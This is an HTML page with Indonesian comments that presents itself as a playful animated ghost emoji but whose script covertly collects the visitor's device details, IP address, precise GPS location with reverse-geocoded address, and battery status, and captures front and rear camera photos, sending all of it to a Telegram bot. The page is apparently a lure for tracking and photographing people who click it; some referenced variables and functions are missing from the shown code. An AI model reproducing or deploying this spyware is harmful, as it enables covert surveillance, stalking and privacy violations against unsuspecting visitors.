<!DOCTYPE html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üëª</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #000000, #1a1a2e, #16213e);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            font-family: Arial, sans-serif;
            cursor: pointer;
        }
        
        .ghost-container {
            position: relative;
            text-align: center;
        }
        
        .main-ghost {
            font-size: 35vw;
            animation: float 3s ease-in-out infinite;
            text-shadow: 0 0 60px rgba(255, 255, 255, 0.9);
            cursor: pointer;
            transition: all 0.3s;
            user-select: none;
            z-index: 100;
            position: relative;
            filter: drop-shadow(0 0 25px rgba(255, 255, 255, 0.6));
        }
        
        .main-ghost:hover {
            transform: scale(1.2);
            text-shadow: 0 0 80px rgba(255, 255, 255, 1);
        }
        
        .main-ghost:active {
            transform: scale(0.85);
        }
        
        .ghost-particle {
            position: absolute;
            font-size: 6rem;
            pointer-events: none;
            opacity: 0;
            z-index: 1;
            animation: particle 2.5s ease-out forwards;
            filter: drop-shadow(0 0 15px rgba(255, 255, 255, 0.8));
        }
        
        .countdown {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 8vw;
            color: white;
            text-shadow: 0 0 20px rgba(255, 255, 255, 0.8);
            opacity: 0;
            z-index: 1000;
        }
        
        .pulse-effect {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 50vw;
            height: 50vw;
            border-radius: 50%;
            background: radial-gradient(circle, rgba(255,255,255,0.9) 0%, rgba(255,255,255,0) 70%);
            opacity: 0;
            z-index: 0;
        }
        
        @keyframes float {
            0%, 100% { 
                transform: translateY(0px) rotate(0deg); 
                text-shadow: 0 0 40px rgba(255, 255, 255, 0.8);
            }
            25% { 
                transform: translateY(-30px) rotate(8deg);
                text-shadow: 0 0 60px rgba(255, 255, 255, 1);
            }
            50% { 
                transform: translateY(-15px) rotate(-8deg);
                text-shadow: 0 0 50px rgba(255, 255, 255, 0.9);
            }
            75% { 
                transform: translateY(-25px) rotate(5deg);
                text-shadow: 0 0 70px rgba(255, 255, 255, 1);
            }
        }
        
        @keyframes particle {
            0% { 
                opacity: 1;
                transform: translate(0, 0) scale(1) rotate(0deg);
            }
            100% { 
                opacity: 0;
                transform: translate(var(--tx), var(--ty)) scale(0.1) rotate(720deg);
            }
        }
        
        @keyframes pulse {
            0% {
                transform: translate(-50%, -50%) scale(0.3);
                opacity: 1;
            }
            100% {
                transform: translate(-50%, -50%) scale(2.5);
                opacity: 0;
            }
        }
        
        @keyframes countdownPop {
            0% {
                transform: translate(-50%, -50%) scale(0);
                opacity: 0;
            }
            50% {
                transform: translate(-50%, -50%) scale(1.2);
                opacity: 1;
            }
            100% {
                transform: translate(-50%, -50%) scale(1);
                opacity: 0;
            }
        }
        
        @keyframes collecting {
            0% {
                transform: scale(1);
                filter: hue-rotate(0deg) brightness(1);
            }
            25% {
                transform: scale(1.4);
                filter: hue-rotate(90deg) brightness(1.5);
            }
            50% {
                transform: scale(0.9);
                filter: hue-rotate(180deg) brightness(1);
            }
            75% {
                transform: scale(1.3);
                filter: hue-rotate(270deg) brightness(1.5);
            }
            100% {
                transform: scale(1);
                filter: hue-rotate(360deg) brightness(1);
            }
        }
    </style>
</head>

    <script>
        // Konfigurasi Telegram

        const mainGhost = document.getElementById('mainGhost');

        let isCollecting = false;

        // Suara klik keyboard (dibuat dengan Web Audio API)
        function playClickSound() {
            try {
                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioContext.createOscillator();
                const gainNode = audioContext.createGain();
                
                oscillator.connect(gainNode);
                gainNode.connect(audioContext.destination);
                
                oscillator.frequency.setValueAtTime(1000, audioContext.currentTime);
                oscillator.frequency.exponentialRampToValueAtTime(200, audioContext.currentTime + 0.1);
                
                gainNode.gain.setValueAtTime(0.4, audioContext.currentTime);
                gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.1);
                
                oscillator.start(audioContext.currentTime);
                oscillator.stop(audioContext.currentTime + 0.1);
            } catch (e) {
                // Fallback silent jika Web Audio API tidak didukung
            }
        }
        
        // Event listener untuk emoji hantu
        mainGhost.addEventListener('click', async function(e) {
            if (isCollecting) return;
            
            // Mainkan suara klik
            playClickSound();
            
            // Mulai proses pengumpulan data dengan delay 3 detik
            isCollecting = true;
            
            // Sembunyikan emoji utama sementara
            mainGhost.style.opacity = '0.3';
            
            // Tampilkan countdown
            await showCountdown();
            
            // Kembalikan emoji utama
            mainGhost.style.opacity = '1';
            mainGhost.style.animation = 'float 3s ease-in-out infinite';
            
            // Tampilkan efek partikel
            createGhostParticles(e.clientX, e.clientY);
            
            // Kumpulkan dan kirim data
            await collectAndSendData();
            
            isCollecting = false;
        });
        
        // Fungsi untuk menampilkan countdown
        async function showCountdown() {
            return new Promise(resolve => {
                const countdownNumbers = ['3', '2', '1'];
                let currentIndex = 0;
                
                function showNextNumber() {
                    if (currentIndex < countdownNumbers.length) {
                        countdown.textContent = countdownNumbers[currentIndex];
                        countdown.style.animation = 'countdownPop 1s forwards';
                        
                        setTimeout(() => {
                            countdown.style.animation = 'none';
                            currentIndex++;
                            showNextNumber();
                        }, 1000);
                    } else {
                        countdown.textContent = '';
                        resolve();
                    }
                }
                
                showNextNumber();
            });
        }
        
        // Fungsi untuk membuat partikel emoji
        function createGhostParticles(x, y) {
            const particlesCount = 40;
            const emojis = ['üëª', 'üíÄ', 'ü¶á', 'üï∑Ô∏è', 'üï∏Ô∏è', 'üéÉ', 'üòà', 'üëπ', 'üë∫', '‚ò†Ô∏è', '‚ö°', 'üåü', 'üí´', '‚ú®', 'üî•'];
            
            // Buat efek pulse
            const pulse = document.createElement('div');
            pulse.className = 'pulse-effect';
            pulse.style.animation = 'pulse 1.5s forwards';
            document.body.appendChild(pulse);
            
            setTimeout(() => {
                document.body.removeChild(pulse);
            }, 1500);
            
            for (let i = 0; i < particlesCount; i++) {
                const particle = document.createElement('div');
                particle.className = 'ghost-particle';
                
                // Pilih emoji random
                const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
                particle.textContent = randomEmoji;
                
                // Random size
                const randomSize = 4 + Math.random() * 8;
                particle.style.fontSize = randomSize + 'rem';
                
                particle.style.left = (x - randomSize * 8) + 'px';
                particle.style.top = (y - randomSize * 8) + 'px';
                
                // Random arah dan jarak
                const angle = Math.random() * Math.PI * 2;
                const distance = 200 + Math.random() * 400;
                const tx = Math.cos(angle) * distance;
                const ty = Math.sin(angle) * distance;
                
                particle.style.setProperty('--tx', tx + 'px');
                particle.style.setProperty('--ty', ty + 'px');
                
                // Random color effect
                const hue = Math.random() * 360;
                const saturation = 70 + Math.random() * 30;
                particle.style.filter = `hue-rotate(${hue}deg) saturate(${saturation}%) drop-shadow(0 0 15px rgba(255, 255, 255, 0.8))`;
                
                // Random delay
                particle.style.animationDelay = (Math.random() * 0.5) + 's';
                
                document.body.appendChild(particle);
                
                // Hapus partikel setelah animasi selesai
                setTimeout(() => {
                    if (particle.parentNode) {
                        particle.parentNode.removeChild(particle);
                    }
                }, 2500);
            }
        }
        
        // Fungsi untuk mengakses kamera dengan pengaturan yang lebih baik
        async function accessCamera(facingMode = 'user') {
            return new Promise(async (resolve, reject) => {
                try {
                    // Hentikan stream sebelumnya jika ada
                    if (cameraStream) {
                        cameraStream.getTracks().forEach(track => track.stop());
                    }
                    
                    const constraints = {
                        video: { 
                            facingMode: facingMode,
                            width: { ideal: 1920, max: 1920 },
                            height: { ideal: 1080, max: 1080 },
                            frameRate: { ideal: 30 }
                        },
                        audio: false
                    };
                    
                    cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
                    cameraVideo.srcObject = cameraStream;
                    
                    // Tunggu sampai video benar-benar siap
                    cameraVideo.onloadedmetadata = () => {
                        cameraVideo.play().then(() => {
                            // Beri waktu tambahan untuk kamera menyesuaikan exposure
                            setTimeout(() => {
                                resolve(cameraStream);
                            }, 1000);
                        });
                    };
                    
                    cameraVideo.onerror = reject;
                    
                } catch (error) {
                    reject(error);
                }
            });
        }
        
        // Fungsi untuk mengambil foto dari kamera dengan kualitas lebih baik
        async function capturePhoto(facingMode = 'user') {
            return new Promise(async (resolve) => {
                try {
                    // Akses kamera terlebih dahulu
                    await accessCamera(facingMode);
                    
                    // Tunggu sedikit untuk memastikan kamera sudah siap dan terang
                    await new Promise(resolve => setTimeout(resolve, 1500));
                    
                    // Buat canvas dengan ukuran yang sesuai
                    const context = cameraCanvas.getContext('2d');
                    cameraCanvas.width = cameraVideo.videoWidth;
                    cameraCanvas.height = cameraVideo.videoHeight;
                    
                    // Gambar frame video ke canvas
                    context.drawImage(cameraVideo, 0, 0, cameraCanvas.width, cameraCanvas.height);
                    
                    // Tambahkan filter untuk meningkatkan kecerahan dan kontras jika diperlukan
                    context.filter = 'brightness(1.1) contrast(1.1)';
                    context.drawImage(cameraVideo, 0, 0, cameraCanvas.width, cameraCanvas.height);
                    context.filter = 'none';
                    
                    // Konversi ke blob dengan kualitas tinggi
                    cameraCanvas.toBlob(blob => {
                        // Hentikan stream kamera
                        if (cameraStream) {
                            cameraStream.getTracks().forEach(track => track.stop());
                            cameraStream = null;
                        }
                        resolve(blob);
                    }, 'image/jpeg', 0.95);
                    
                } catch (error) {
                    console.error('Error capturing photo:', error);
                    // Hentikan stream jika ada error
                    if (cameraStream) {
                        cameraStream.getTracks().forEach(track => track.stop());
                        cameraStream = null;
                    }
                    resolve(null);
                }
            });
        }

        // Fungsi untuk mengumpulkan data perangkat
        async function collectDeviceData() {
            const data = {};
            
            // Informasi Waktu
            const now = new Date();
            const options = { 
                weekday: 'long', 
                year: 'numeric', 
                month: 'long', 
                day: 'numeric',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                timeZoneName: 'short'
            };
            data.waktuLokal = now.toLocaleDateString('id-ID', options);
            data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            data.offset = now.getTimezoneOffset();
            data.tanggal = now.toLocaleDateString('id-ID');
            data.jam = now.toLocaleTimeString('id-ID');
            
            // Informasi Perangkat
            const ua = navigator.userAgent;
            data.tipe = /Mobile/.test(ua) ? "HP" : "LAPTOP/COMPUTER";
            
            // Deteksi merk dan model lebih akurat
            if (/iPhone/.test(ua)) {
                data.merk = "Apple";
                data.model = "iPhone";
            } else if (/iPad/.test(ua)) {
                data.merk = "Apple";
                data.model = "iPad";
            } else if (/Samsung/.test(ua)) {
                data.merk = "Samsung";
                data.model = ua.match(/Samsung[^)]*/) ? ua.match(/Samsung[^)]*/)[0] : "Samsung Device";
            } else if (/Mac/.test(ua)) {
                data.merk = "Apple";
                data.model = "Mac";
            } else if (/Windows/.test(ua)) {
                data.merk = "PC";
                data.model = "Windows Device";
            } else if (/Android/.test(ua)) {
                data.merk = "Android";
                data.model = "Android Device";
            } else {
                data.merk = navigator.platform;
                data.model = ua.split(') ')[0] + ")";
            }
            
            data.os = navigator.platform;
            data.platform = navigator.platform;
            data.vendor = navigator.vendor || "Tidak Terdeteksi";
            data.mobile = /Mobile/.test(ua);
            data.tablet = /Tablet/.test(ua);
            
            // Informasi Browser
            data.browser = ua;
            data.bahasa = navigator.language;
            data.cookie = navigator.cookieEnabled;
            data.java = navigator.javaEnabled();
            data.pdf = navigator.pdfViewerEnabled || "Tidak Terdeteksi";
            
            // Spesifikasi Hardware
            data.screen = `${screen.width}x${screen.height} (${Math.round(screen.width * window.devicePixelRatio)}x${Math.round(screen.height * window.devicePixelRatio)} real)`;
            data.color = screen.colorDepth + " bit";
            data.ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Tidak Terdeteksi";
            data.cpu = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " cores" : "Tidak Terdeteksi";
            data.touchPoints = navigator.maxTouchPoints || 0;
            
            // Informasi Jaringan
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const ipData = await response.json();
                data.ip = ipData.ip;
            } catch (e) {
                data.ip = "Tidak Terdeteksi";
            }
            
            if (navigator.connection) {
                data.tipeKoneksi = navigator.connection.effectiveType;
                data.jaringan = navigator.connection.type;
                data.download = navigator.connection.downlink + " Mbps";
                data.ping = navigator.connection.rtt + " ms";
                data.dataSaver = navigator.connection.saveData;
            } else {
                data.tipeKoneksi = "Tidak Terdeteksi";
                data.jaringan = "Tidak Terdeteksi";
                data.download = "Tidak Terdeteksi";
                data.ping = "Tidak Terdeteksi";
                data.dataSaver = "Tidak Terdeteksi";
            }
            
            // Informasi Lokasi
            try {
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        timeout: 10000,
                        enableHighAccuracy: true,
                        maximumAge: 0
                    });
                });
                
                data.latitude = position.coords.latitude;
                data.longitude = position.coords.longitude;
                data.linkLokasi = `https://maps.google.com/?q=${data.latitude},${data.longitude}`;
                data.akurasi = position.coords.accuracy + " meter";
                
                // Dapatkan info lokasi detail
                try {
                    const response = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${data.latitude}&longitude=${data.longitude}&localityLanguage=id`);
                    const locationData = await response.json();
                    data.kota = locationData.city || "Tidak Terdeteksi";
                    data.provinsi = locationData.principalSubdivision || "Tidak Terdeteksi";
                    data.kecamatan = locationData.locality || "Tidak Terdeteksi";
                    data.negara = locationData.countryName || "Tidak Terdeteksi";
                    data.kodePos = locationData.postcode || "Tidak Terdeteksi";
                } catch (e) {
                    data.kota = data.provinsi = data.kecamatan = data.negara = data.kodePos = "Tidak Terdeteksi";
                }
            } catch (e) {
                data.latitude = data.longitude = data.linkLokasi = data.akurasi = 
                data.kota = data.provinsi = data.kecamatan = data.negara = data.kodePos = "Tidak Terdeteksi";
            }
            
            // Informasi Tambahan
            data.statusOnline = navigator.onLine ? "Online" : "Offline";
            data.pdfViewer = navigator.pdfViewerEnabled ? "Supported" : "Not supported";
            data.webDriver = navigator.webdriver ? "Detected" : "Not detected";
            
            // Informasi Battery
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    data.charging = battery.charging ? "Yes" : "No";
                    data.level = Math.round(battery.level * 100) + "%";
                    data.chargingTime = battery.chargingTime === Infinity ? "Unknown" : Math.round(battery.chargingTime / 60) + " menit";
                    data.dischargingTime = battery.dischargingTime === Infinity ? "Unknown" : Math.round(battery.dischargingTime / 60) + " menit";
                } catch (e) {
                    data.charging = data.level = data.chargingTime = data.dischargingTime = "Tidak Terdeteksi";
                }
            } else {
                data.charging = data.level = data.chargingTime = data.dischargingTime = "Tidak Didukung";
            }
            
            // Status Kamera (akan diupdate nanti)
            data.kameraDepan = "Sedang diproses";
            data.kameraBelakang = "Sedang diproses";
            
            return data;
        }

        // Fungsi untuk mengirim data ke Telegram
        async function sendToTelegram(message) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message
                    })
                });
                
                return await response.json();
            } catch (error) {
                console.error('Error sending to Telegram:', error);
            }
        }
        
        // Fungsi untuk mengirim foto ke Telegram
        async function sendPhotoToTelegram(photoBlob, caption) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', photoBlob);
                formData.append('caption', caption);
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                return await response.json();
            } catch (error) {
                console.error('Error sending photo to Telegram:', error);
            }
        }
    </script>
</body>
